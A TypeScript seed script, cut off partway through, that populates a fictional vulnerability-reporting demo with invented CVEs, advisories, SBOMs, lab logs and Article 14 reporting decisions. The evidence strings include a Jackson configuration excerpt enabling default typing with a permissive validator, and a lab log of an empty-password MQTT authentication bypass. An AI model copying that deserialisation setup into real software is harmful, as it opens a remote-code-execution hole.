import type { Seeder } from '../server/seeder.ts'
import { COMPONENTS, CRITERIA, DEPLOYMENTS, ESCALATION, ORG, PRODUCT_COMPONENTS, USERS, products } from './portfolio.ts'

/**
 * The demo case script.
 *
 * Ten fictional cases, chosen so that every state NEXUS distinguishes
 * appears at least once. Times are relative to the moment of seeding, except
 * where a case exists to exercise the 11 September 2026 boundary; those use
 * absolute dates.
 *
 *   mosquitto    both awareness dates before 11 Sep     -> not reportable (transitional)
 *   jackson      vulnerability before, exploitation after -> reportable; 72h critical
 *   sqlite       full lifecycle                           -> closed
 *   libxml2      three products, three justifications     -> not affected, not reportable
 *   libarchive   measure available                        -> final-report clock running
 *   curl         reachability unknown                     -> under investigation
 *   busybox      one product affected, one not            -> 24h deadline under pressure
 *   openssl/SEG  awareness just established               -> the active clock
 *   openssl/SCA  corrected awareness timestamp            -> correction on the record
 *   nginx        scanner hit only                         -> investigating, no clock
 */

const M = 60_000
const H = 60 * M
const D = 24 * H
const A = (iso: string) => Date.parse(iso)

export function seedDemo(s: Seeder, T: number, demoPassword: string | null): void {
  const iso = (t: number) => new Date(t).toISOString()
  const hm = (t: number) => iso(t).slice(11, 16)

  s.org(ORG)
  s.users(USERS, demoPassword)
  s.criteria(CRITERIA)
  s.escalation(ESCALATION)
  s.auditOnly(A('2026-08-01T07:00:00Z'), 'u-admin', 'DEMO_DATA_SEEDED', 'NEXUS initialised with the fictional Tessaline Systems demo organisation', { demo: true })
  s.portfolio(A('2026-08-01T08:00:00Z'), { products: products(T), components: COMPONENTS, productComponents: PRODUCT_COMPONENTS, deployments: DEPLOYMENTS }, 'u-eng')

  // ===========================================================================
  // mosquitto -- both awareness dates precede application: not reportable
  // ===========================================================================
  s.vulnerability('v.mosquitto', A('2026-09-02T08:40:00Z'), {
    cve: 'CVE-2026-990613',
    title: 'Authentication bypass via crafted CONNECT with empty password field',
    cwe: 'CWE-287',
    cvssScore: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    severity: 'CRITICAL',
    description:
      'A CONNECT packet carrying a username with a zero-length password field is accepted by the password-file authentication plugin before the credential check completes, granting publish and subscribe rights. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-MOSQUITTO',
    affectedVersions: '<2.0.18',
    fixedVersion: '2.0.18',
    exploitability: 'Network, unauthenticated, low complexity',
    exploitation: 'NOT_OBSERVED',
    source: 'Upstream security advisory (fictional)',
    discoveredAt: '2026-09-02T07:55:00.000Z',
    vendorAdvisory: 'https://advisories.example/mosquitto/2026-09-02',
    threatIntelReference: null,
  }, 'u-analyst')
  s.openCase('c6', A('2026-09-02T09:05:00Z'), {
    title: 'Mosquitto authentication bypass -- gateway and controller brokers',
    vulnKey: 'v.mosquitto',
    productIds: ['PRD-SEG', 'PRD-ROC'],
    ownerId: 'u-analyst',
    createdBy: 'u-analyst',
    collaboratorIds: ['u-eng'],
    tags: ['mqtt', 'ot'],
    summary: 'Broker authentication bypass in the bundled mosquitto. Both brokers listen on customer OT networks.',
  })
  s.evidence('c6.advisory', A('2026-09-02T09:10:00Z'), {
    caseKey: 'c6', type: 'VENDOR_ADVISORY', title: 'Upstream advisory: mosquitto CONNECT authentication bypass',
    description: 'Advisory text as received on the PSIRT mailbox.', source: 'PSIRT mailbox (upstream advisory mail)',
    sourceCreatedAt: A('2026-09-02T07:55:00Z'), ownerId: 'u-analyst', fileName: 'advisory-mosquitto-20260902.txt',
    links: [{ targetType: 'vulnerability', key: 'v.mosquitto' }],
    content: `UPSTREAM SECURITY ADVISORY (fictional, demo data)\nPublished: 2026-09-02 07:55 UTC\nIdentifier: CVE-2026-990613\nComponent: eclipse-mosquitto < 2.0.18\n\nSummary: A CONNECT packet with a username and a zero-length password field is\naccepted by the password-file authentication plugin before the credential check\ncompletes. The client is granted the ACL of the named user.\n\nFixed in: 2.0.18\nWorkaround: none for the password-file plugin; restrict listener exposure.\n`,
  })
  s.event('c6.detection', A('2026-09-02T09:12:00Z'), {
    caseKey: 'c6', type: 'DETECTION', occurredAt: A('2026-09-02T08:30:00Z'), timezone: 'Europe/Berlin', actorId: 'u-analyst',
    source: 'PSIRT mailbox, upstream advisory mail (mail server message trace)', sourceKind: 'system_of_record', evidenceKeys: ['c6.advisory'],
  })
  s.evidence('c6.ticket', A('2026-09-02T13:55:00Z'), {
    caseKey: 'c6', type: 'TICKET', title: 'PSIRT-2198 confirmation record', description: 'Ticket history showing the Confirmed transition.',
    source: 'PSIRT tracker', sourceCreatedAt: A('2026-09-02T14:10:00Z'), ownerId: 'u-lead', fileName: 'PSIRT-2198.txt',
    content: `PSIRT-2198  mosquitto CONNECT authentication bypass\n2026-09-02 09:05 UTC  created by priya.raman\n2026-09-02 13:40 UTC  SBOM check: SEG 4.2.1 ships mosquitto 2.0.15; ROC 2.8.0 ships 2.0.15\n2026-09-02 14:10 UTC  state Triage -> Confirmed by jonas.weber\n                      "Present in two shipped products, in range. Vulnerability confirmed."\n`,
  })
  s.event('c6.va', A('2026-09-02T14:14:00Z'), {
    caseKey: 'c6', type: 'VULNERABILITY_AWARENESS', occurredAt: A('2026-09-02T14:10:00Z'), timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2198 state Triage -> Confirmed (tracker server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c6.ticket'], criterionId: 'AC-01',
  })
  s.intel(A('2026-09-06T08:50:00Z'), 'v.mosquitto', {
    source: 'Partner CERT bulletin (fictional exchange feed)', observed: true, firstObserved: A('2026-08-29T00:00:00Z'), confidence: 'HIGH',
    indicator: 'CONNECT with empty password field from 198.51.100.0/24', reference: 'https://cert-exchange.example/bulletins/2026-0906-03', analystId: 'u-analyst',
  })
  s.evidence('c6.cert', A('2026-09-06T09:20:00Z'), {
    caseKey: 'c6', type: 'THREAT_INTELLIGENCE', title: 'Partner CERT bulletin: in-the-wild exploitation of OT brokers',
    description: 'Bulletin reporting exploitation against exposed OT MQTT brokers since 29 Aug.', source: 'Partner CERT exchange (TLP:AMBER)',
    sourceCreatedAt: A('2026-09-06T08:30:00Z'), ownerId: 'u-analyst', fileName: 'cert-bulletin-2026-0906-03.txt',
    content: `PARTNER CERT BULLETIN 2026-0906-03 (fictional, demo data)  TLP:AMBER\nSubject: Exploitation of MQTT broker authentication bypass (CVE-2026-990613)\n\nObserved: exploitation against internet- and plant-network-exposed brokers.\nFirst observed: 2026-08-29 (day precision)\nIndicators: CONNECT packets with empty password field, sources in 198.51.100.0/24\nAssessment: reliable -- confirmed by two member CSIRTs from victim telemetry.\n`,
  })
  s.exploitation(A('2026-09-06T09:25:00Z'), 'v.mosquitto', 'CONFIRMED', 'u-mgr', 'c6')
  s.event('c6.occurrence', A('2026-09-06T09:40:00Z'), {
    caseKey: 'c6', type: 'OCCURRENCE', occurredAt: A('2026-08-29T00:00:00Z'), timezone: 'UTC', actorId: 'u-analyst',
    source: 'Partner CERT bulletin 2026-0906-03, first observed exploitation (day precision)', sourceKind: 'external_document', evidenceKeys: ['c6.cert'],
  })
  s.event('c6.ea', A('2026-09-06T09:45:00Z'), {
    caseKey: 'c6', type: 'EXPLOITATION_AWARENESS', occurredAt: A('2026-09-06T09:30:00Z'), timezone: 'Europe/Berlin', actorId: 'u-mgr',
    source: 'Security Manager validation of partner CERT evidence (sign-off recorded on PSIRT-2198)', sourceKind: 'system_of_record', evidenceKeys: ['c6.cert'], criterionId: 'AC-03',
  })
  s.evidence('c6.sbom', A('2026-09-08T09:00:00Z'), {
    caseKey: 'c6', type: 'SBOM', title: 'SBOM excerpts: SecureEdge 4.2.1 and RemoteOps 2.8.0 (mosquitto)',
    description: 'CycloneDX component entries for the bundled broker.', source: 'Build pipeline SBOM export', sourceCreatedAt: A('2026-09-08T08:40:00Z'),
    ownerId: 'u-eng', fileName: 'sbom-mosquitto-excerpt.json',
    content: JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', note: 'fictional demo excerpt', components: [{ product: 'SecureEdge Gateway 4.2.1', name: 'eclipse-mosquitto', version: '2.0.15', purl: 'pkg:generic/eclipse-mosquitto@2.0.15' }, { product: 'RemoteOps Controller 2.8.0', name: 'eclipse-mosquitto', version: '2.0.15', purl: 'pkg:generic/eclipse-mosquitto@2.0.15' }] }, null, 2),
  })
  s.evidence('c6.lab', A('2026-09-08T10:10:00Z'), {
    caseKey: 'c6', type: 'EXPLOIT_EVIDENCE', title: 'Lab reproduction against SecureEdge 4.2.1 and RemoteOps 2.8.0',
    description: 'Crafted CONNECT accepted by both brokers in the product lab.', source: 'Product security lab notebook', sourceCreatedAt: A('2026-09-08T10:00:00Z'),
    ownerId: 'u-eng', fileName: 'lab-repro-mosquitto.log',
    content: `lab-repro 2026-09-08 (fictional, demo data)\n[10:02:11Z] target seg-lab-01 (SecureEdge 4.2.1) :8883  CONNECT user=sensor01 password=<empty>\n[10:02:11Z] CONNACK rc=0  SUBSCRIBE plant/# accepted\n[10:04:40Z] target roc-lab-02 (RemoteOps 2.8.0) :1883  CONNECT user=telemetry password=<empty>\n[10:04:40Z] CONNACK rc=0  PUBLISH plant/actuators/set accepted\nresult: authentication bypass reproduced on both products\n`,
  })
  const exposedYes = (note: string, ev: string[] = []): [ 'YES', string, string[] ] => ['YES', note, ev]
  s.determination('c6.det.seg', A('2026-09-08T10:30:00Z'), {
    caseKey: 'c6', productId: 'PRD-SEG', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'The bundled broker accepts the crafted CONNECT on the sensor LAN listener. Reproduced in the lab against the shipped build.',
    answers: {
      component_present: exposedYes('SBOM lists eclipse-mosquitto 2.0.15.', ['c6.sbom']),
      vulnerable_version: exposedYes('2.0.15 < 2.0.18.', ['c6.sbom']),
      functionality_enabled: exposedYes('Password-file authentication is the shipped default.'),
      feature_reachable: exposedYes('The broker is the ingest point for all sensor traffic.'),
      exploit_path: exposedYes('Any host on the sensor LAN can send CONNECT.'),
      configuration_mitigates: ['NO', 'The vulnerable plugin is the default configuration.'],
      compensating_control: ['YES', 'Customer guidance: restrict 8883 to the sensor VLAN.'],
      exploitation_demonstrated: ['YES', 'Reproduced in the lab.', ['c6.lab']],
      product_validation: ['YES', 'Lab reproduction on the shipped 4.2.1 image.', ['c6.lab']],
    },
  })
  s.determination('c6.det.roc', A('2026-09-08T15:10:00Z'), {
    caseKey: 'c6', productId: 'PRD-ROC', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'Telemetry broker on the plant network accepts the crafted CONNECT. Reproduced in the lab.',
    answers: {
      component_present: exposedYes('SBOM lists eclipse-mosquitto 2.0.15.', ['c6.sbom']),
      vulnerable_version: exposedYes('2.0.15 < 2.0.18.', ['c6.sbom']),
      functionality_enabled: exposedYes('Password-file authentication enabled.'),
      feature_reachable: exposedYes('Broker receives all plant telemetry.'),
      exploit_path: exposedYes('Plant-network hosts can reach 1883.'),
      configuration_mitigates: ['NO', 'Default configuration is vulnerable.'],
      compensating_control: ['NO', ''],
      exploitation_demonstrated: ['YES', 'Reproduced in the lab.', ['c6.lab']],
      product_validation: ['YES', 'Lab reproduction on the shipped 2.8.0 image.', ['c6.lab']],
    },
  })
  s.evidence('c6.release', A('2026-09-12T16:10:00Z'), {
    caseKey: 'c6', type: 'TICKET', title: 'Release records: SEG 4.2.1-hf3, ROC 2.8.0-hf7 (mosquitto 2.0.18)',
    description: 'Hotfix builds published to the customer portal.', source: 'Release management (build server)', sourceCreatedAt: A('2026-09-12T16:00:00Z'),
    ownerId: 'u-eng', fileName: 'release-hotfix-mosquitto.txt',
    content: `REL-4.2.1-hf3  SecureEdge Gateway   published 2026-09-12 16:00 UTC  mosquitto 2.0.18\nREL-2.8.0-hf7  RemoteOps Controller published 2026-09-12 16:00 UTC  mosquitto 2.0.18\n(fictional, demo data)\n`,
  })
  s.event('c6.measure', A('2026-09-12T16:20:00Z'), {
    caseKey: 'c6', type: 'MEASURE_AVAILABLE', occurredAt: A('2026-09-12T16:00:00Z'), timezone: 'UTC', actorId: 'u-eng',
    source: 'Release records REL-4.2.1-hf3 and REL-2.8.0-hf7 (build server)', sourceKind: 'system_of_record', evidenceKeys: ['c6.release'],
  })
  s.decision('c6.dec', A('2026-09-15T10:05:00Z'), {
    caseKey: 'c6', analystId: 'u-lead', outcome: 'DO_NOT_REPORT', nonReportReason: 'TRANSITIONAL_PRE_APPLICATION', confidence: 'HIGH', recordKey: 'c6.record',
    evidenceKeys: ['c6.ticket', 'c6.cert'],
    exploitationBasis: 'Partner CERT bulletin 2026-0906-03, validated by the Security Manager on 6 Sep.',
    rationale:
      'Both awareness dates precede Article 14 application: vulnerability awareness on 2 Sep 14:10 UTC (PSIRT confirmation) and exploitation awareness on 6 Sep 09:30 UTC (validated CERT evidence), both before 11 Sep 2026 00:00 CEST. This decision is recorded after the application date, but applicability turns on the awareness dates, not on the decision date. Both products are affected; remediation shipped on 12 Sep and continues outside the Article 14 workflow.',
  })
  s.review(A('2026-09-15T15:40:00Z'), { caseKey: 'c6', reportKey: 'c6.record', reviewerId: 'u-legal', action: 'APPROVE', comment: 'The transitional analysis matches counsel\'s reading of Art. 71(2). Both awareness dates are sourced from systems of record.' })
  s.comment(A('2026-09-15T15:42:00Z'), { caseKey: 'c6', authorId: 'u-legal', body: '@Compliance counsel concurs: both dates precede application, so no Article 14 notification is owed. Keep the decision record on the case file; the products remain affected and the hotfix tracking continues.' })
  s.transition(A('2026-09-15T16:00:00Z'), 'c6.record', 'CLOSED', 'u-lead', 'Decision record filed.')

  // ===========================================================================
  // jackson -- two-date rule: vulnerability known before, exploitation after
  // ===========================================================================
  s.vulnerability('v.jackson', A('2026-09-03T07:55:00Z'), {
    cve: 'CVE-2026-990812',
    title: 'Polymorphic deserialisation gadget in plugin type resolver',
    cwe: 'CWE-502',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    severity: 'CRITICAL',
    description:
      'With default typing enabled, a crafted JSON document can name a gadget class that the type resolver instantiates during deserialisation, leading to remote code execution. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-JACKSON',
    affectedVersions: '>=2.10.0 <2.16.1',
    fixedVersion: '2.16.1',
    exploitability: 'Network, unauthenticated where the endpoint accepts polymorphic input',
    exploitation: 'NOT_OBSERVED',
    source: 'Dependency advisory feed (fictional)',
    discoveredAt: '2026-09-02T21:00:00.000Z',
    vendorAdvisory: 'https://advisories.example/jackson-databind/2026-09-02',
    threatIntelReference: null,
  }, 'u-analyst2')
  s.openCase('c3', A('2026-09-03T08:10:00Z'), {
    title: 'jackson-databind deserialisation gadget -- BridgeCloud Console',
    vulnKey: 'v.jackson', productIds: ['PRD-BCC'], ownerId: 'u-analyst2', createdBy: 'u-analyst2', collaboratorIds: ['u-eng'],
    tags: ['deserialisation', 'console'],
    summary: 'Plugin configuration endpoint deserialises polymorphic JSON. Known before 11 Sep; exploitation became known after it.',
  })
  s.evidence('c3.advisory', A('2026-09-03T08:12:00Z'), {
    caseKey: 'c3', type: 'VENDOR_ADVISORY', title: 'Dependency advisory: jackson-databind polymorphic gadget', description: 'Advisory from the dependency feed.',
    source: 'Dependency advisory feed', sourceCreatedAt: A('2026-09-02T21:00:00Z'), ownerId: 'u-analyst2', fileName: 'advisory-jackson-20260902.txt',
    links: [{ targetType: 'vulnerability', key: 'v.jackson' }],
    content: `DEPENDENCY ADVISORY DEP-7731 (fictional, demo data)\nPublished: 2026-09-02 21:00 UTC\nIdentifier: CVE-2026-990812\nPackage: com.fasterxml.jackson.core:jackson-databind >=2.10.0 <2.16.1\nCondition: default typing / polymorphic handling enabled\nImpact: remote code execution via gadget class instantiation\nFixed: 2.16.1\n`,
  })
  s.event('c3.detection', A('2026-09-03T08:15:00Z'), {
    caseKey: 'c3', type: 'DETECTION', occurredAt: A('2026-09-03T07:50:00Z'), timezone: 'UTC', actorId: 'u-analyst2',
    source: 'Dependency advisory feed alert DEP-7731 (SCA pipeline, CI server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c3.advisory'],
  })
  s.evidence('c3.ticket', A('2026-09-03T12:50:00Z'), {
    caseKey: 'c3', type: 'TICKET', title: 'PSIRT-2203 confirmation record', description: 'Confirmed: console enables polymorphic typing for plugin configuration.',
    source: 'PSIRT tracker', sourceCreatedAt: A('2026-09-03T13:00:00Z'), ownerId: 'u-lead', fileName: 'PSIRT-2203.txt',
    content: `PSIRT-2203  jackson-databind polymorphic gadget\n2026-09-03 08:10 UTC  created by tomas.ferreira\n2026-09-03 12:30 UTC  code search: PluginConfigController uses activateDefaultTyping\n2026-09-03 13:00 UTC  state Triage -> Confirmed by jonas.weber\n`,
  })
  s.event('c3.va', A('2026-09-03T13:04:00Z'), {
    caseKey: 'c3', type: 'VULNERABILITY_AWARENESS', occurredAt: A('2026-09-03T13:00:00Z'), timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2203 state Triage -> Confirmed (tracker server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c3.ticket'], criterionId: 'AC-01',
  })
  s.evidence('c3.sbom', A('2026-09-04T09:00:00Z'), {
    caseKey: 'c3', type: 'SBOM', title: 'SBOM excerpt: BridgeCloud Console 2026.3', description: 'jackson-databind entry.', source: 'Build pipeline SBOM export',
    sourceCreatedAt: A('2026-09-04T08:50:00Z'), ownerId: 'u-eng', fileName: 'sbom-bcc-jackson.json',
    content: JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', note: 'fictional demo excerpt', metadata: { component: { name: 'BridgeCloud Console', version: '2026.3' } }, components: [{ name: 'jackson-databind', group: 'com.fasterxml.jackson.core', version: '2.15.2', purl: 'pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.15.2' }] }, null, 2),
  })
  s.evidence('c3.config', A('2026-09-04T09:30:00Z'), {
    caseKey: 'c3', type: 'CONFIGURATION', title: 'PluginConfigController ObjectMapper configuration', description: 'Source excerpt showing default typing on the plugin endpoint.',
    source: 'Source repository (console, tag 2026.3)', sourceCreatedAt: A('2026-08-20T10:00:00Z'), ownerId: 'u-eng', fileName: 'PluginConfigController-excerpt.txt',
    content: `// console/src/main/java/.../PluginConfigController.java @ tag 2026.3 (fictional excerpt)\nObjectMapper mapper = JsonMapper.builder()\n    .activateDefaultTyping(LaissezFaireSubTypeValidator.instance, DefaultTyping.NON_FINAL)\n    .build();\n// POST /api/v2/plugins/{id}/config  -> mapper.readValue(body, PluginConfig.class)\n`,
  })
  s.determination('c3.det', A('2026-09-04T11:20:00Z'), {
    caseKey: 'c3', productId: 'PRD-BCC', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'The plugin configuration endpoint deserialises attacker-supplied JSON with default typing and a permissive validator. Reachable by any authenticated console user; unauthenticated where customers expose the plugin API.',
    answers: {
      component_present: exposedYes('SBOM lists jackson-databind 2.15.2.', ['c3.sbom']),
      vulnerable_version: exposedYes('2.15.2 is in >=2.10.0 <2.16.1.', ['c3.sbom']),
      functionality_enabled: exposedYes('activateDefaultTyping with LaissezFaire validator.', ['c3.config']),
      feature_reachable: exposedYes('POST /api/v2/plugins/{id}/config.', ['c3.config']),
      exploit_path: exposedYes('Request body is attacker-controlled.'),
      configuration_mitigates: ['NO', 'No subtype allow-list in the shipped configuration.'],
      compensating_control: ['NO', ''],
      exploitation_demonstrated: ['NO', 'Not demonstrated at determination time.'],
      product_validation: ['YES', 'Code review against tag 2026.3.', ['c3.config']],
    },
  })
  s.intel(T - 69 * H, 'v.jackson', {
    source: 'Threat-intel partner report (fictional)', observed: true, firstObserved: T - 80 * H, confidence: 'HIGH',
    indicator: 'Serialised gadget chain posted to /api/v2/plugins/*/config', reference: 'https://intel.example/reports/TI-2026-0931', analystId: 'u-analyst2',
  })
  s.evidence('c3.ti', T - 68.5 * H, {
    caseKey: 'c3', type: 'THREAT_INTELLIGENCE', title: 'Partner report TI-2026-0931: exploitation of console plugin endpoints',
    description: 'Report of in-the-wild exploitation against self-hosted management consoles.', source: 'Threat-intel partner (TLP:AMBER)',
    sourceCreatedAt: T - 70 * H, ownerId: 'u-analyst2', fileName: 'TI-2026-0931.txt',
    content: `TI-2026-0931 (fictional, demo data)  TLP:AMBER\nExploitation of CVE-2026-990812 against self-hosted management consoles.\nFirst observed: ${iso(T - 80 * H)}\nPattern: POST /api/v2/plugins/<id>/config with a gadget-class @type field\nSources: 203.0.113.0/24\nConfidence: high (victim telemetry from three organisations)\n`,
  })
  s.evidence('c3.ir', T - 68.3 * H, {
    caseKey: 'c3', type: 'INCIDENT_RECORD', title: 'IR-0938: exploitation at a customer console install',
    description: 'Incident response record from a customer engagement.', source: 'Incident response case system', sourceCreatedAt: T - 68 * H,
    ownerId: 'u-lead', fileName: 'IR-0938.txt',
    content: `IR-0938 (fictional, demo data)\nOpened: ${iso(T - 68.4 * H)}\nCustomer: [redacted in demo]\nFinding: console access log shows POST /api/v2/plugins/7/config from 203.0.113.61\n         followed by a child process spawned by the console JVM.\nConfirmed exploitation: ${iso(T - 68 * H)} (IR lead sign-off)\n`,
  })
  s.evidence('c3.customer', T - 67 * H, {
    caseKey: 'c3', type: 'CUSTOMER_COMMUNICATION', classification: 'restricted', title: 'Customer notification draft (privileged)',
    description: 'Draft customer communication prepared with counsel.', source: 'Legal / customer success', sourceCreatedAt: T - 67.2 * H,
    ownerId: 'u-legal', fileName: 'customer-notice-draft.txt',
    content: `PRIVILEGED AND CONFIDENTIAL -- prepared at the request of counsel (fictional, demo data)\nDraft notice to BridgeCloud Console customers regarding CVE-2026-990812.\nRecommended action: restrict /api/v2/plugins to administrative networks until 2026.3.2.\n`,
  })
  s.exploitation(T - 68.2 * H, 'v.jackson', 'CONFIRMED', 'u-mgr', 'c3')
  s.event('c3.occurrence', T - 68.1 * H, {
    caseKey: 'c3', type: 'OCCURRENCE', occurredAt: T - 80 * H, timezone: 'UTC', actorId: 'u-analyst2',
    source: 'Partner report TI-2026-0931, first observed exploitation', sourceKind: 'external_document', evidenceKeys: ['c3.ti'],
  })
  s.event('c3.ea', T - 67.9 * H, {
    caseKey: 'c3', type: 'EXPLOITATION_AWARENESS', occurredAt: T - 68 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'IR-0938 confirmed-exploitation sign-off (IR case system clock)', sourceKind: 'system_of_record', evidenceKeys: ['c3.ir'], criterionId: 'AC-04',
  })
  s.decision('c3.dec', T - 66 * H, {
    caseKey: 'c3', analystId: 'u-lead', outcome: 'REPORT', confidence: 'HIGH', evidenceKeys: ['c3.ti', 'c3.ir'],
    exploitationBasis: 'IR-0938 confirmed exploitation at a customer install; corroborated by partner report TI-2026-0931.',
    rationale:
      'The vulnerability was known on 3 Sep, before the application date, but its active exploitation became known only after it (IR-0938). Awareness of an actively exploited vulnerability therefore arises after 11 Sep 2026 and Article 14 applies. BridgeCloud Console is affected and made available in the EU. Report.',
  })
  s.report('c3.ew', T - 65 * H, { caseKey: 'c3', kind: 'EARLY_WARNING', userId: 'u-analyst2' })
  s.transition(T - 64.8 * H, 'c3.ew', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(T - 62 * H, { caseKey: 'c3', reportKey: 'c3.ew', reviewerId: 'u-mgr', action: 'APPROVE', comment: 'Member States and mitigation guidance present. Approved.' })
  s.transition(T - 61 * H, 'c3.ew', 'READY', 'u-lead')
  s.submit(T - 60 * H, 'c3.ew', 'u-lead')
  s.transition(T - 58 * H, 'c3.ew', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  s.comment(T - 20 * H, { caseKey: 'c3', authorId: 'u-eng', body: 'Hotfix 2026.3.2 (jackson-databind 2.16.1) is in QA. @PSIRT the final-report clock starts when we publish it, not before.' })
  s.report('c3.notif', T - 3 * H, { caseKey: 'c3', kind: 'VULNERABILITY_NOTIFICATION', userId: 'u-analyst2' })
  s.comment(T - 2.8 * H, { caseKey: 'c3', authorId: 'u-analyst2', body: 'Notification draft v1.0 is ready. @SecurityLead @Compliance it needs both approvals before the 72-hour deadline.' })

  // ===========================================================================
  // sqlite -- full lifecycle, closed
  // ===========================================================================
  s.vulnerability('v.sqlite', A('2026-09-11T09:00:00Z'), {
    cve: 'CVE-2026-990901',
    title: 'Integer overflow in FTS5 tokenizer leads to heap corruption',
    cwe: 'CWE-190',
    cvssScore: 7.8,
    cvssVector: 'CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
    severity: 'HIGH',
    description: 'A crafted token stream overflows a length calculation in the FTS5 tokenizer, corrupting the heap. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-SQLITE',
    affectedVersions: '<3.44.0',
    fixedVersion: '3.44.0',
    exploitability: 'Local, via crafted content indexed by FTS5',
    exploitation: 'SUSPECTED',
    source: 'Threat-intel feed (fictional)',
    discoveredAt: '2026-09-11T08:40:00.000Z',
    vendorAdvisory: 'https://advisories.example/sqlite/2026-09-11',
    threatIntelReference: 'https://intel.example/reports/TI-2026-0902',
  }, 'u-analyst2')
  s.evidence('c9.ti', A('2026-09-11T09:41:00Z'), {
    caseKey: 'c9', type: 'THREAT_INTELLIGENCE', title: 'TI-4402: exploitation of SQLite FTS5 in endpoint agents',
    description: 'Feed alert with first-observed date.', source: 'Threat-intel feed via SIEM', sourceCreatedAt: A('2026-09-11T08:40:00Z'),
    ownerId: 'u-analyst2', fileName: 'TI-4402.txt',
    content: `TI-4402 (fictional, demo data)\nCVE-2026-990901 -- FTS5 tokenizer integer overflow\nObserved against endpoint agents that index event text.\nFirst observed: 2026-09-10 16:00 UTC\n`,
  })
  s.openCase('c9', A('2026-09-11T09:40:00Z'), {
    title: 'SQLite FTS5 overflow -- SecureConnect Agent event queue', vulnKey: 'v.sqlite', productIds: ['PRD-SCA'], ownerId: 'u-analyst2', createdBy: 'u-analyst2',
    tags: ['endpoint'], summary: 'Agent event queue indexes event text with FTS5. First case handled end to end under Article 14.',
  })
  s.event('c9.detection', A('2026-09-11T09:42:00Z'), {
    caseKey: 'c9', type: 'DETECTION', occurredAt: A('2026-09-11T08:55:00Z'), timezone: 'UTC', actorId: 'u-analyst2',
    source: 'SIEM alert TI-4402 (Tessaline SOC SIEM, UTC)', sourceKind: 'system_of_record', evidenceKeys: ['c9.ti'],
  })
  s.event('c9.occurrence', A('2026-09-11T09:45:00Z'), {
    caseKey: 'c9', type: 'OCCURRENCE', occurredAt: A('2026-09-10T16:00:00Z'), timezone: 'UTC', actorId: 'u-analyst2',
    source: 'TI-4402 first-observed exploitation', sourceKind: 'external_document', evidenceKeys: ['c9.ti'],
    note: 'Exploitation began before the application date. Applicability still turns on awareness.',
  })
  s.evidence('c9.ticket', A('2026-09-11T11:10:00Z'), {
    caseKey: 'c9', type: 'TICKET', title: 'PSIRT-2215 confirmation record', description: 'Agent 7.1.0 ships sqlite 3.42.0 with FTS5.', source: 'PSIRT tracker',
    sourceCreatedAt: A('2026-09-11T11:20:00Z'), ownerId: 'u-lead', fileName: 'PSIRT-2215.txt',
    content: `PSIRT-2215  sqlite FTS5 overflow\n2026-09-11 09:40 UTC  created by tomas.ferreira\n2026-09-11 11:20 UTC  state Triage -> Confirmed by jonas.weber\n`,
  })
  s.event('c9.va', A('2026-09-11T11:24:00Z'), {
    caseKey: 'c9', type: 'VULNERABILITY_AWARENESS', occurredAt: A('2026-09-11T11:20:00Z'), timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2215 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c9.ticket'], criterionId: 'AC-01',
  })
  s.evidence('c9.ir', A('2026-09-12T07:30:00Z'), {
    caseKey: 'c9', type: 'INCIDENT_RECORD', title: 'IR-0907: exploitation at an MSP partner estate', description: 'Confirmed exploitation of agents at an MSP partner.',
    source: 'Incident response case system', sourceCreatedAt: A('2026-09-12T07:45:00Z'), ownerId: 'u-lead', fileName: 'IR-0907.txt',
    content: `IR-0907 (fictional, demo data)\nMSP partner reports agent crashes followed by persistence on 14 endpoints.\nRoot cause: crafted event text indexed by the agent's FTS5 queue.\nConfirmed exploitation: 2026-09-12 07:45 UTC\n`,
  })
  s.evidence('c9.log', A('2026-09-12T07:35:00Z'), {
    caseKey: 'c9', type: 'LOG', title: 'Agent crash telemetry (14 endpoints)', description: 'Crash signatures from the partner estate.', source: 'Agent telemetry pipeline',
    sourceCreatedAt: A('2026-09-12T06:58:00Z'), ownerId: 'u-analyst2', fileName: 'agent-crash-telemetry.log',
    content: `2026-09-12T05:12:44Z agent=7.1.0 host=ep-3321 signal=SIGSEGV frame=fts5UnicodeTokenize+0x1c4\n2026-09-12T05:13:02Z agent=7.1.0 host=ep-3322 signal=SIGSEGV frame=fts5UnicodeTokenize+0x1c4\n... 12 further endpoints, identical frame (fictional, demo data)\n`,
  })
  s.exploitation(A('2026-09-12T07:40:00Z'), 'v.sqlite', 'CONFIRMED', 'u-mgr', 'c9')
  s.event('c9.ea', A('2026-09-12T07:52:00Z'), {
    caseKey: 'c9', type: 'EXPLOITATION_AWARENESS', occurredAt: A('2026-09-12T07:45:00Z'), timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'IR-0907 confirmed-exploitation sign-off (IR case system clock)', sourceKind: 'system_of_record', evidenceKeys: ['c9.ir', 'c9.log'], criterionId: 'AC-04',
  })
  s.evidence('c9.sbom', A('2026-09-12T09:30:00Z'), {
    caseKey: 'c9', type: 'SBOM', title: 'SBOM excerpt: SecureConnect Agent 7.1.0', description: 'sqlite entry.', source: 'Build pipeline SBOM export',
    sourceCreatedAt: A('2026-09-12T09:20:00Z'), ownerId: 'u-eng', fileName: 'sbom-sca-sqlite.json',
